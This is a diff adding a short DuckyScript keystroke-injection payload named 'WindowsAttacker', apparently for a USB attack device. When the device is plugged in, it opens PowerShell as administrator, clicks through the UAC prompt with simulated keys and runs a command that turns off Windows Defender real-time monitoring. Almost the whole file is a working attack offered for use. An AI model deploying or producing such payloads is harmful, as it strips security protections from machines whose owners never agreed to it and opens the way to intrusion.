@@ -1,0 +1,36 @@
+REM	Title: WindowsAttacker
+REM	Author: White_Wid0w
+REM	Description: uses powershell under admin to turn off windows defender on a machine.
+
+REM	Target: Windows OS
+
+
+
+
+DELAY 500
+GUI r 
+DELAY 500 
+STRING powershell 
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 6000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER 
+
+REM END
+
+
+
+
+
+
+
+
+
+
+
+
+
